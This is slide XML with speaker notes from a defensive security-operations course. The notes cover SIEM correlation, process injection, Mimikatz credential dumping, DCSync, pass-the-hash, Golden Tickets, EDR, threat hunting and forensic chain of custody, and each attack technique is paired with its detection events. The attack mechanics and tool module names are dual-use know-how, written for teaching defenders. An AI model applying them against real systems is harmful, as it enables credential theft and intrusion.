              <a:t>The practical limitation of external threat feeds is that hash-based indicators have short shelf lives, as discussed in the Pyramid of Pain, attackers trivially change file hashes. Organizations should treat hash feeds as useful but low-durability inputs and invest primarily in TTP-level detection rules derived from the Attack Pattern objects in intelligence feeds. The CISA Automated Indicator Sharing (AIS) program, established under the Cybersecurity Information Sharing Act of 2015, provides free STIX/TAXII feeds to US organizations and is particularly valuable for critical infrastructure sectors. Industry-specific Information Sharing and Analysis Centers (ISACs) provide sector-tailored intelligence, the Financial Services ISAC (FS-ISAC) is particularly mature, having shared intelligence across member banks since 1999.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>High-quality government threat feeds, such as CISA's Automated Indicator Sharing over TAXII, are available at no cost. The quality of analysis matters more than the raw quantity of indicators.</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SIEM is the operational hub of a security operations center. Without a SIEM, the log sources discussed throughout this class, Windows Event Logs, Sysmon, firewall logs, Active Directory, exist as isolated data islands that cannot be correlated. The SIEM's primary value is correlation: detecting patterns that span multiple systems and multiple time periods.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The most powerful SIEM correlation rules are multi-event, multi-source rules. A single failed logon is noise. Five hundred failed logons from the same external IP address against multiple accounts within thirty seconds is a brute-force attack. A successful logon (Event ID 4624) immediately following that brute-force pattern from the same source IP is confirmation that the brute force succeeded, requiring immediate analyst response. No single log source captures this complete picture; only SIEM correlation can surface it.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Modern SIEMs include two major commercial platforms: Microsoft Sentinel (cloud-native, Azure-integrated) and Splunk Enterprise Security (on-premises or cloud). Both support the MITRE ATT&amp;CK framework natively, Sentinel's Fusion detection engine automatically maps alerts to ATT&amp;CK techniques, and Splunk's ES includes ATT&amp;CK correlation rules in its content packages. The open-source alternative is the ELK Stack (Elasticsearch, Logstash, Kibana) with the Elastic SIEM add-on, which provides a fully functional detection platform at no license cost.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>SIEM effectiveness is critically dependent on tuning. Out-of-the-box detection rules generate enormous volumes of false positives in most environments, a phenomenon called "alert fatigue" that directly contributed to the missed alerts in the 2013 Target breach. Effective SIEM tuning requires building organization-specific baselines: what processes normally run on workstations, which accounts normally authenticate at which hours, and which external IP ranges represent normal business traffic. Deviations from these baselines should trigger alerts; normal activity should be suppressed. NIST SP 800-92 section 4.4 provides guidance on log retention, storage sizing, and performance planning for centralized log management systems.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>A SIEM with a high false-positive rate destroys analyst trust: an analyst facing ninety-five percent false positives begins dismissing alerts reflexively, the "cry wolf" effect. This human factor is as important as the technical implementation and is often overlooked in SIEM deployments.</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Process injection is one of the most important adversary techniques to understand from a detection perspective because it is used at multiple stages of an attack: for privilege escalation, defense evasion, and credential access. Understanding the mechanisms helps analysts know where to look for detection artifacts.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Classic DLL injection is the foundational technique. An attacker gains a handle to a target process, allocates memory within that process using VirtualAllocEx, writes the path of a malicious DLL into that memory using WriteProcessMemory, then creates a remote thread using CreateRemoteThread that calls LoadLibrary with the malicious DLL path. The DLL loads into the target process and executes its DllMain entry point. The detection artifact for this technique is Sysmon Event ID 8 (CreateRemoteThread) from an unexpected source process. Legitimate use of CreateRemoteThread is rare, debuggers and some anti-cheat systems use it, but these are well-known exceptions that can be excluded from detection rules.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Reflective DLL injection, developed by Stephen Fewer in 2008 and now the primary technique used by Metasploit Meterpreter and Cobalt Strike Beacon, improves on classic injection by loading a DLL from memory rather than disk. The DLL contains its own custom loader that resolves Windows API imports and relocates the image without requiring LoadLibrary. This leaves no trace on disk, the malicious DLL never touches the file system. Detection requires memory analysis: Volatility's malfind plugin identifies memory regions with executable permissions that contain MZ (PE) headers but are not mapped to a file on disk.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Process hollowing (also called RunPE or process replacement) creates a legitimate process in a suspended state, for example, svchost.exe or notepad.exe, then unmaps its image from memory using NtUnmapViewOfSection and maps a malicious image in its place. The process is then resumed, executing the attacker's code under the identity and icon of a legitimate Windows process. Detection opportunities include: the spawning process creating a child in SUSPEND mode (unusual parent-child relationship), and image load events where the file hash does not match the executable on disk.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Credential-dumping tools target lsass.exe (MITRE ATT&amp;CK T1003.001) because that process holds the Windows credential cache in memory, including NTLM hashes and Kerberos ticket material; reading lsass memory yields those credentials directly. This is what Mimikatz does, and it is why EDR products specifically protect lsass process memory from external access.</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Credential theft is the force multiplier of an attack. An attacker who successfully dumps credentials from one compromised system gains the ability to authenticate to every other system that accepts those credentials, without needing to exploit any additional vulnerabilities. This is why the Lateral Movement phase of ATT&amp;CK follows so closely after the Credential Access phase.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>LSASS memory access is the most operationally important technique to detect. The Windows Local Security Authority Subsystem Service (lsass.exe) is responsible for enforcing security policy and storing authentication credentials in memory for single sign-on. Mimikatz's sekurlsa::logonpasswords module opens a handle to lsass.exe with PROCESS_VM_READ access and reads credential structures directly from memory. Sysmon Event ID 10 (Process Access) captures this handle open, recording the source process, target process (lsass.exe), and the requested access rights. A detection rule that fires on any process, other than known-good security tools, requesting VM_READ access to lsass.exe is a high-fidelity indicator of credential dumping. Windows Credential Guard, introduced in Windows 10 and Server 2016, defends against this by moving the credential cache into a virtualization-based security (VBS) isolated environment that lsass.exe itself cannot directly access.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>DCSync is a particularly sophisticated credential dumping technique that does not require any local code execution on the domain controller. Instead, the attacker's tool (Mimikatz lsadump::dcsync) uses legitimate Active Directory replication APIs to request password hashes from the domain controller, impersonating another domain controller requesting synchronization. From the domain controller's perspective, this looks like a normal replication request, unless the requesting account is not actually a domain controller. Security Event ID 4662, logged on the domain controller when a DS-Replication-Get-Changes-All replication operation is performed, is the primary detection for DCSync. A SIEM rule that fires on this event from any account that is not listed as a domain controller computer account provides high-precision detection.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The NTDS.dit file is the Active Directory database that contains password hashes for all domain accounts. It is locked by the domain controller OS during normal operation, but attackers can extract it using Volume Shadow Copy service commands or the ntdsutil.exe utility, both of which are legitimate administrative tools (LoTL again). Monitoring ntdsutil.exe execution (Sysmon Event ID 1) and any Volume Shadow Copy creation (System Event 7036) on domain controllers is an effective detection control.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>A credential-dumping attack against lsass is operationally simple, yet it leaves a clear artifact: Sysmon Event ID 10 records the cross-process access to lsass memory. The contrast between how easy the attack is and how visible it is in the log is the core detection lesson.</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Lateral movement is where many attacks transition from limited impact to enterprise-wide compromise. An attacker who controls a single workstation can cause relatively contained damage. An attacker who has moved laterally to a domain controller can modify Group Policy, create new administrative accounts, and potentially control every device in the Active Directory forest.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Pass-the-Hash (PtH) is the most common lateral movement technique observed in enterprise compromises. An attacker who has dumped NTLM hashes from a compromised host can authenticate to other Windows systems that accept NTLM without knowing the plaintext password. The hash itself serves as the authentication credential. Detection relies on identifying NTLM authentication events (Event ID 4624 with the authentication package showing NtLmSsp) originating from workstation accounts rather than service accounts or administrators, particularly during off-hours when legitimate administrators are not working.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>PsExec deserves particular attention because it is widely used by both legitimate administrators and attackers. Microsoft Sysinternals PsExec operates by copying a service binary (PSEXESVC.exe) to the target system's ADMIN$ share and creating a service to execute it. This process generates three distinct detectable events: a network share access event (5140), a service installation event (7045 with service name PSEXESVC), and a process creation event on the remote system. The combination of these three events from a non-administrative source workstation is a reliable indicator. Notably, several variants of PsExec exist that use different service names (METERPRETER, etc.), SIEM rules should monitor for any service installation from a remote source followed by immediate execution, not just PSEXESVC specifically.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Detecting Pass-the-Ticket attacks requires monitoring for Kerberos authentication anomalies. A Golden Ticket attack (MITRE ATT&amp;CK T1558.001) involves forging a Kerberos Ticket Granting Ticket (TGT) using the KRBTGT account hash, obtainable from a domain controller. Golden Tickets can be created with arbitrary expiration times (attackers set them to ten years) and arbitrary group memberships, allowing complete unrestricted access to any Kerberos resource. Detection requires monitoring for TGTs with unusual lifetimes (Event ID 4769) and domain controller Event ID 4672 (Special Logon) on accounts that should not have administrative access.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>A legitimate administrative RDP session and attacker RDP lateral movement produce identical events; the difference is contextual, which account, from which source workstation, at what time, to which destination. Distinguishing them is where SIEM enrichment with asset inventory and user-behavior baselines becomes essential.</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Endpoint Detection and Response, a term coined by Gartner analyst Anton Chuvakin in 2013, represents the evolution beyond traditional antivirus. While antivirus operates by matching files against signature databases, EDR continuously records endpoint activity and applies behavioral analysis to detect attacks that use legitimate tools or novel malware variants.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The defining architectural capability of EDR is continuous telemetry recording with retroactive query capability. When a SOC analyst investigates a suspicious alert, they can query the EDR's historical telemetry to see exactly what happened before, during, and after the suspicious event, even if it occurred two weeks ago. This is called "retrospective detection" and it allows security teams to scope incidents and identify patient-zero hosts without relying on incomplete log coverage. CrowdStrike Falcon Insight retains endpoint telemetry for ninety days by default; Microsoft Defender for Endpoint retains data for thirty days.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The major EDR platforms differ in their integration approach. Microsoft Defender for Endpoint (MDE) is deeply integrated with the Microsoft 365 ecosystem, it ingests Azure AD identity events, Exchange email telemetry, and SharePoint access logs alongside endpoint events, providing a unified investigation view. CrowdStrike Falcon is known for its lightweight agent architecture (approximately 1.5% CPU overhead) and its Threat Graph, a graph database linking adversary relationships across the global CrowdStrike customer base. SentinelOne differentiates on autonomous response: its Storyline AI can automatically remediate detections without human analyst intervention, including rolling back ransomware file encryption using Volume Shadow Copy snapshots.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>EDR platforms have become essential for detecting the techniques covered in this class. The credential dumping techniques discussed previously, lsass.exe access, DCSync, are detected natively by all major EDR platforms and result in automatic process termination in their highest protection modes. Process injection techniques (Sysmon Event ID 8) are similarly detected and blocked. This explains why sophisticated threat actors increasingly target EDR platforms themselves, several intrusion campaigns have included techniques to disable or tamper with EDR agents (MITRE ATT&amp;CK T1562.001, Impair Defenses: Disable or Modify Tools).</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>An EDR investigation timeline shows a complete process tree with child processes, network connections and file operations in one view, which makes an incident's full chain legible in a way isolated log lines cannot.</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hunting bridges the gap between automated detection (which only finds known-bad patterns) and complete ignorance of adversary presence. It is the practice of assuming that sophisticated adversaries may already be in the environment, having bypassed automated controls, and actively searching for their footprints.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The SANS threat hunting model defines three hunter personas based on experience level. Level 0 hunters rely entirely on automated tooling and vendor-provided detections. Level 1 hunters investigate SIEM alerts manually but do not proactively search. Level 2 hunters formulate hypotheses and conduct structured data analysis. Level 3 hunters develop custom detection models, reverse engineer adversary tools, and contribute back to the threat intelligence community.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Effective threat hunting begins with a hypothesis derived from threat intelligence. For example, if a threat intelligence report indicates that a specific APT group is targeting your industry sector and uses WMI event subscriptions for persistence, the hunt hypothesis is: "Are there unauthorized WMI event subscriptions active in our environment?" The data source for this hypothesis is the WMI repository, queryable via PowerShell (Get-WMIObject -Namespace root\subscription -Class __EventFilter). The hunt query enumerates all WMI subscriptions and compares them against a known-good baseline. Any subscription that does not match the baseline is an anomaly requiring investigation.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The Sqrrl (now AWS) Threat Hunting Reference Model introduced the concept of the "hunting loop" and identified three hypothesis types: intelligence-driven (based on threat reports), situational awareness (based on environmental changes), or domain expertise (based on deep knowledge of attacker techniques). All three paths lead to the same investigation process. The key differentiator of mature threat hunting programs is their feedback loop: every completed hunt either discovers an incident (value realized) or, more commonly, identifies a detection gap (also value realized, new SIEM rules are written to automate future detection of the hunted technique). This continuous improvement cycle is what drives SOC maturity from Level 1 to Level 3.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>NIST SP 800-137A (Assessing Information Security Continuous Monitoring Programs) provides assessment criteria for evaluating the maturity of threat hunting programs within the broader continuous monitoring framework. Organizations seeking to demonstrate detection capability to auditors or certifiers (such as FedRAMP or PCI DSS assessors) can use this framework to evidence their hunting practices.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>A threat hunt proceeds from a hypothesis to a data source to evidence: for a system suspected of running a Cobalt Strike beacon, the hypothesis is process injection, the data sources are Sysmon's image-load events and memory-analysis output such as malfind, and the evidence is injected memory regions in a host process. This reproduces the full detection chain end to end.</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Correcting widely held misconceptions is one of the most valuable educational activities in a security course, because incorrect mental models lead to poor decisions with real organizational consequences. Let us work through each misconception in detail.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Misconception 1, Antivirus Sufficiency: Traditional antivirus operates by comparing file hashes and byte sequences against a database of known malware signatures. This approach is effective against known, unmodified malware samples but fails completely against several common attacker techniques. Fileless malware (T1059 scripting interpreters) never writes to disk. Polymorphic malware automatically alters its byte structure to produce new hashes on each infection. Living-Off-the-Land techniques use signed system binaries that AV whitelists by definition. The 2023 Verizon Data Breach Investigations Report (DBIR) confirmed that AV detection was not the primary detection method in a majority of investigated breaches.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Misconception 4, Rebooting to remove malware: This is particularly dangerous in a forensic context. Incident responders frequently encounter situations where well-meaning IT staff have rebooted compromised systems, destroying volatile memory evidence. The RFC 3227 Order of Volatility exists specifically because this instinct is natural but harmful. Beyond evidence destruction, rebooting does not remove malware that has established any form of persistence, registry Run keys, scheduled tasks, installed services, or WMI event subscriptions all survive reboots by design.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Misconception 5, Encrypted traffic analysis: JA3 fingerprinting, developed by John Althouse of Salesforce, creates a hash of TLS Client Hello parameters (SSL version, cipher suites, extensions, elliptic curves). These parameters vary between TLS implementations, and the JA3 hash for Cobalt Strike Beacon's default TLS implementation differs from the JA3 hash produced by a legitimate web browser, even when the payload is encrypted. Security vendors including Suricata, Zeek (Bro), and commercial NDR platforms include JA3 matching as a detection capability. This fundamentally undermines the attacker assumption that TLS encryption provides detection immunity.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Security misconceptions tend to reflect the maturity of the organizations where they were learned, which is why they form and persist differently across industry cultures.</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 generation without log centralization provides no meaningful security value. An attacker who compromises a host can clear local logs (Security Event ID 1102) to remove evidence of their activity. If those logs were only stored locally, the forensic record is destroyed. Centralized, tamper-resistant log storage ensures that log records survive a host compromise and remain available for investigation.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Windows Event Forwarding (WEF) is the native Microsoft solution for centralizing Windows Event Logs across an enterprise. The WEF architecture uses WS-Management (the same protocol as PowerShell remoting) to pull events from source computers to a central Windows Event Collector (WEC) server. Administrators define "subscriptions" that specify which event channels and event IDs to forward. A well-configured WEF deployment can forward high-priority events (Security log, Sysmon) with sub-second latency while forwarding lower-priority events in batches to reduce network overhead. WEF uses Kerberos authentication by default, ensuring that only authorized computers can deliver events.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Log retention requirements are driven by compliance frameworks and practical forensic needs. The Payment Card Industry Data Security Standard (PCI DSS) Requirement 10.7 mandates twelve months of log retention with three months immediately available for analysis. HIPAA Security Rule section 164.312(b) requires audit log retention for six years. NIST SP 800-92 Table 4-1 provides retention guidance by log source type, recommending ninety days of online retention for security logs in federal environments. Forensically, the relevant question is: how far back might an investigation need to reach? Given that the median attacker dwell time is sixteen days (Mandiant M-Trends 2023), ninety days of immediately queryable log retention provides adequate investigation capability for most incidents. However, advanced persistent threat campaigns like SUNBURST demonstrate that dwell times can extend to many months, justifying longer archival retention for high-value systems.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Log integrity is a frequently overlooked architectural requirement. If an attacker can modify stored logs before investigators review them, the forensic record is compromised. Tamper evidence can be implemented by computing HMAC-SHA256 hashes of log batches at ingestion time and storing those hashes in a separate, isolated system. Any modification to the log data will produce a hash mismatch detectable during investigation. AWS CloudTrail and Azure Monitor implement similar log integrity verification natively for cloud audit logs.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Log retention is costly at scale: an organization generating a terabyte of raw logs a day accumulates 365 terabytes a year, a significant storage budget. Security architects must make deliberate, documented decisions about which log sources justify long-term retention and which can be discarded after thirty days.</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severity classification framework is a foundational operational tool for any security operations center. Without consistent severity definitions, analysts make independent subjective decisions about escalation, leading to inconsistent response times and potential failure to escalate critical incidents promptly.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The classification criteria should be documented in the SOC's Standard Operating Procedures (SOP) and reviewed regularly as the organization's threat landscape evolves. The criteria typically evaluate three dimensions: the confidence level of the indicator (high confidence behavioral match vs. low-confidence signature match), the scope of the potential compromise (multiple systems vs. a single workstation), and the potential business impact (systems holding regulated data vs. development workstations).</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>SEV-1 classification should trigger the organization's formal Incident Response Plan, a documented procedure specifying exactly who is contacted, in what sequence, and what immediate actions must be taken. For ransomware specifically, the immediate actions are: network isolation of affected hosts to prevent further encryption spread, notification of legal counsel (ransomware may involve extortion and has legal notification implications), and evidence preservation per RFC 3227 before any remediation actions destroy forensic data. The Cybersecurity and Infrastructure Security Agency (CISA) provides a ransomware response checklist (CISA.gov/stopransomware) that aligns with this framework.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>NIST SP 800-61r2 (Computer Security Incident Handling Guide) provides the foundational framework for incident classification and response procedures. It defines four incident severity categories and maps them to specific response procedures. The NIST classification maps broadly to our five-level framework: NIST Functional Impact Category "High" (organization lost the ability to provide critical services to users) corresponds to our SEV-1 and SEV-2 combined.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>An important operational consideration is the documented "escalation path", who receives the notification for each severity level and what information must be included. SOC analysts often hesitate to escalate borderline incidents for fear of being wrong. The classification framework removes this ambiguity: if the observable indicators match a defined category, escalation is mandatory regardless of the analyst's personal confidence level. This is sometimes called the "escalate in doubt" principle and is explicitly recommended by NIST SP 800-61r2 section 3.2.6.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Severity classification requires looking beyond the initial alert: an alert that appears to be a false positive can sit on top of genuinely malicious activity, so the context behind the alert, not just the alert text, determines the correct severity and escalation.</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Chain of custody is not merely a bureaucratic formality, it is the legal foundation that makes forensic evidence admissible in criminal prosecution, civil litigation, or regulatory proceedings. In the absence of a documented chain of custody, defense counsel can argue that evidence may have been altered, contaminated, or fabricated between the time of seizure and the time of presentation. Courts have excluded digital evidence on these grounds, resulting in failed prosecutions.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The forensic image is the cornerstone of digital evidence preservation. A write-blocker, a hardware or software device that intercepts write commands to a storage medium, is used during imaging to ensure that the acquisition process does not alter any data on the original evidence. Tools such as Forensic Toolkit Imager (FTK Imager), Guymager, and dcfldd create complete, verifiable copies of storage media. The hash verification step is critical: computing SHA-256 hashes of both the original media and the forensic image and confirming they are identical proves that the image is a perfect copy of the original. Any hash discrepancy indicates that the image was not accurately captured and requires re-acquisition.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>ISO/IEC 27037:2012 (Guidelines for Identification, Collection, Acquisition, and Preservation of Digital Evidence) provides the internationally recognized standard for digital evidence handling. It defines the roles of the Digital Evidence First Responder (DEFR), who secures and documents the scene, and the Digital Evidence Specialist (DES), who performs detailed technical acquisition and analysis. The separation of these roles prevents conflicts of interest and ensures that no single person has unchecked control over evidence handling.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Practical chain of custody failures include: failing to photograph evidence before moving it, using inadequate evidence packaging that allows physical damage during transport, failing to document timestamps accurately (use UTC time consistently to avoid timezone confusion in court), and allowing personnel without documented authorization to access evidence storage. The 2012 HBGary Federal security incident resulted in a failed prosecution in part due to evidence handling procedural deficiencies that allowed defense counsel to challenge forensic conclusions.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>For network forensic evidence (PCAP files, SIEM log exports), the same principles apply. Log exports must be hash-verified at export time, and the export process must be documented with the analyst's name, timestamp, and the specific query parameters used to generate the export. SIEM vendors including Splunk and Microsoft Sentinel support cryptographic signing of search result exports for exactly this purpose.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Chain-of-custody documentation must begin before any analysis; it cannot be added retrospectively to steps already taken. Forensic readiness is the organizational state of having evidence-handling procedures in place before an incident, rather than improvising under pressure during one.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="12"/>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is designed as a structured active learning intervention, a brief pause in content delivery for students to consolidate their understanding before continuing. Research in cognitive science consistently demonstrates that retrieval practice (testing yourself on material) produces significantly better long-term retention than passive re-reading. The five-minute individual reflection followed by partner comparison mirrors the think-pair-share pedagogy.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Let us work through the correct answers so the instructor can guide post-exercise discussion. Question 1: The attack chain describes a malicious macro in a Word document exploiting CVE-2017-11882 or a similar vulnerability to spawn a command interpreter (MITRE ATT&amp;CK T1203 Exploitation for Client Execution), which then uses PowerShell with base64-encoded commands for obfuscation (T1059.001 PowerShell, T1027.010 Obfuscated Files or Information: Command Obfuscation). Sysmon Event ID 1 (Process Create) captures each step of this chain, providing the parent-child relationship that makes the attack visible. The base64 encoding is detectable via PowerShell Script Block Logging (Event ID 4104), which decodes the content before logging.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Question 2: An IP address sits at the second level from the bottom of the Pyramid of Pain, rated "Easy" to change. An attacker receiving an IP block will simply move their C2 infrastructure to a new IP within hours. The higher-value indicator to prioritize would be the TTP-level behavior associated with APT29, for example, their use of SUNBURST's domain-generation algorithm pattern (a behavioral signature), their preference for WMI persistence, or their specific Cobalt Strike configuration parameters (malleable C2 profiles).</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Question 3: Rebooting violates RFC 3227's Order of Volatility, specifically the principle that RAM (Random Access Memory) must be captured before it is destroyed. Lost data includes: running processes and their command-line arguments, active network connections and established C2 channels, decrypted cryptographic keys that may be resident in memory, the memory-resident payload if fileless malware is present, and potentially decrypted credentials stored by running browser processes.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Question 4: SIEM correlation rules automate pattern detection for known-bad behaviors defined in advance, they fire when observed events match a predefined condition. Threat hunting is proactive, hypothesis-driven manual investigation that searches for attacker behavior that has not yet been automated into rules. SIEM correlation rules are appropriate for high-volume, well-understood attack patterns (brute force, known persistence techniques). Threat hunting is appropriate when intelligence indicates a specific threat actor may be present, or when investigating coverage gaps where no rules exist.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Question 5: Security Event ID 4662 with DS-Replication-Get-Changes-All from a non-domain-controller source indicates a DCSync attack (MITRE ATT&amp;CK T1003.006). The attacker is using Mimikatz's lsadump::dcsync module or a similar tool to request password hash replication from the domain controller, impersonating a legitimate domain replication partner. This allows extraction of all domain account hashes without direct code execution on the domain controller itself.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="12"/>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important strategic concepts in cybersecurity program design is the balance between Prevention, Detection, and Response. Many organizations, particularly those in early security maturity stages, invest almost entirely in prevention controls: firewalls, antivirus, and access management. While these are necessary, they are not sufficient. The Assume Breach model, discussed at the beginning of this class, directly addresses the consequences of over-reliance on prevention.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The NIST Cybersecurity Framework organizes security capabilities into five core functions: Identify, Protect, Detect, Respond, and Recover. Prevention maps to the Protect function. Detection maps to the Detect function. Response maps to both Respond and Recover. A mature security program invests proportionally across all five functions and measures effectiveness using function-specific key performance indicators. For the Detect function, the primary KPI is Mean Time to Detect (MTTD), the average duration between the start of a compromise and its discovery. For the Respond function, the primary KPI is Mean Time to Respond (MTTR), the average duration between alert generation and incident containment. Mandiant's M-Trends report publishes industry average MTTD annually; the 2023 figure was sixteen days globally, though organizations with mature detection programs achieved median MTTD under four days.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The practical implication is that organizations should treat MTTD reduction as a measurable business objective, not merely a technical aspiration. Each Sysmon deployment, each new SIEM correlation rule, and each threat hunting exercise directly contributes to reducing MTTD. A reduction from thirty-day median MTTD to seven days means an attacker has three fewer weeks to perform reconnaissance, establish persistence, escalate privileges, and exfiltrate data. This translates directly to reduced breach impact cost.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The response function is often the least invested in until after a major incident. Organizations frequently have incident response plans on paper but have never actually tested them through tabletop exercises or simulated incidents. NIST SP 800-61r2 recommends that organizations conduct incident response exercises at least annually, exercising both technical response procedures and organizational communication channels. Without practiced response playbooks, the pressure of a real incident leads to poor decisions, including the destructive actions like rebooting systems or deleting logs that destroy forensic evidence.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Gartner data suggests most organizations spend roughly 50-60% of the security budget on prevention, 30-35% on detection and 10-15% on response. Given that a large share of attacks now bypass prevention controls, that allocation is worth questioning, as it underweights the detection and response capabilities that catch what prevention misses.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="12"/>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wrap up Class 19, remember that detecting device attacks requires a transition from simple signature matching to behavioral analysis. While hardening configurations and access control policies reduce risk, they are not a guarantee of security.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Implementing telemetry systems, monitoring process creation, analyzing registry changes, and following forensics standards allows organizations to identify and investigate active compromises. This visibility is essential for understanding how an attacker gained access and what systems are affected.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>In our next session, Class 20, we will explore incident response. We will learn how to use the evidence gathered during detection to contain threats, eradicate malware, and restore systems to normal operations using structured frameworks.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The detection capabilities covered in Class 19 align with the Detect (DE) function of the NIST Cybersecurity Framework (NIST CSF), specifically the DE.CM (Security Continuous Monitoring) category. Organizations implementing these capabilities should measure their detection maturity against a defined model. A Level 1 SOC detects incidents reactively through signature-based alerts. A Level 2 SOC performs behavioral analysis using SIEM correlation rules. A Level 3 SOC conducts proactive threat hunting, using the MITRE ATT&amp;CK framework to hypothesize and test for adversary behaviors before alerts fire. The ATT&amp;CK Navigator tool, maintained by MITRE, allows security teams to visualize their detection coverage across the entire ATT&amp;CK matrix, identifying gaps where adversary techniques go unmonitored. Endpoint Detection and Response (EDR) solutions, such as Microsoft Defender for Endpoint, CrowdStrike Falcon, and SentinelOne, automate much of the behavioral analysis discussed today by correlating endpoint telemetry with ATT&amp;CK techniques in real time. As we move into Class 20 (Incident Response), the detection and forensic evidence discussed today becomes the input to the formal response process. The quality of telemetry collected, Sysmon logs, memory images, and registry audit data, directly determines the CSIRT's ability to scope, contain, and eradicate a threat. Detection without a structured response plan leaves teams with evidence but no actionable path forward.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
